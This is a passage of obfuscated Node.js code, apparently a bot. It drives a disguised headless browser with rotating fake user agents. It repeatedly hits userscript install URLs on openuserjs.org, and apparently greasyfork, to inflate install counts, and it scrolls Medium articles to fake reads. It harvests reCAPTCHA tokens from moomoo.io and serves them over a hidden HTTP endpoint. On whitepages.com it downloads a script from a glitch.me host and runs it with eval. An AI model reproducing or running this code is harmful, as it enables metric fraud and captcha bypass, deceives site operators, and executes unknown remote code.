      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + W(0xb) + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + V(0x7) + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + W(0x10) + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    W(0x2) + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x611 * -0x1 + -0x1 * 0x2474 + -0x3 * -0xa21
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const Y = c;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0xc * -0x23b + 0x55c + -0x2020)[Y(0x13) + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0xd * 0x175 + 0x16b6 + -0x361), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x22a2 + -0x461 + 0x2767), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x1 * 0x7bd + 0x2263 + -0x2a20;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x1 * -0xc11 + 0x1b9 + -0xdca; w < getRandomInt(-0x238 + 0x1b54 + -0x191b, -0x188d + 0x20b2 + -0x820); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x1699 * -0x10 + 0x18b63 * -0x1 + 0x1 * 0x10c33);
        }
      }();
    }, -0x2 * 0x10ca + -0x122d + 0x3425), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const Z = d;

      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + Z(0x8)]();
      let w = 0x1cf7 * 0x1 + -0x38 * 0x8b + 0x171 * 0x1;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x1738 + -0x1db1 + 0x679, 0x1 * 0x9cf + 0xa1f + -0x13bc)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x3464 + 0x5e0d + -0x1d41);
    }, -0x1225 + -0x5 * 0x657 + -0x283 * -0x14), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x22e * 0x11 + -0xdf5 + -0x1719;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x1993 + -0x795 * -0x2 + -0x1d05), await u['evaluate'](() => {
            const a0 = d;
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + a0(0x16) + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x1 * -0x1c + 0x577 * -0x3 + -0x5 * -0x34d), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x1602de + 0x3fe * 0x10f + 0x4 * 0x7e127);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0xef7 + 0x42d + -0x6 * 0x320);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const a1 = c,
      i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x310 + -0x9f6 + -0x1 * -0x7ae);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || a1(0x18) + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x2 * 0x18f9 + -0x399 + -0xec9 * 0x1);
}
doFlags['doOUJS'] && ((async () => {
  const a4 = c,
    a3 = d;
  async function f() {
    const a2 = d,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0xe * 0x71 + -0x20a + 0x839 * 0x1) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x151 * -0x19 + -0x281 * -0xc + 0x1 * 0x2de));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x24f2 + 0x24fd + -0xb, D['indexOf']('\x20'));
        return B ? E['slice'](-0x7 * -0x549 + -0x2e2 * -0x2 + -0x2ac3, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x3e75 + -0x3b8f + 0x1 * 0x242a),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x1 * 0x921 + 0x33eb + -0x6 * 0x9f),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + a2(0x17) + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + a3(0xc) + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      a4(0x12) + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x2ba + 0xe9 * -0x22 + -0x10d6 * -0x2; k < 0x1b21 + 0x10b7 + -0x2bd4; k++)
    setTimeout(f, (0x2 * -0x222a + -0xde6f + -0x6907 * -0x5) * k * getRandomInt(0x14d * -0x3 + -0x150d + 0x18f5, 0x1 * 0x22fe + 0x6c5 * 0x5 + 0x6e2 * -0xa));
  setInterval(() => {
    f();
    for (let l = -0x20ac + 0x1418 + 0x284 * 0x5; l < -0xbc4 * 0x2 + 0x122f + 0x1 * 0x55d; l++)
      setTimeout(f, (-0x33 * 0x5ca + -0x1 * 0x7c5f + 0xd9ff * 0x3) * l * getRandomInt(-0x12b2 + -0x12af + -0xae * -0x37, 0x2d * 0x5b + 0x175d + 0x7 * -0x59f));
  }, 0x1883f4 + -0x5e11f5 + -0xb5123 * -0xb);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
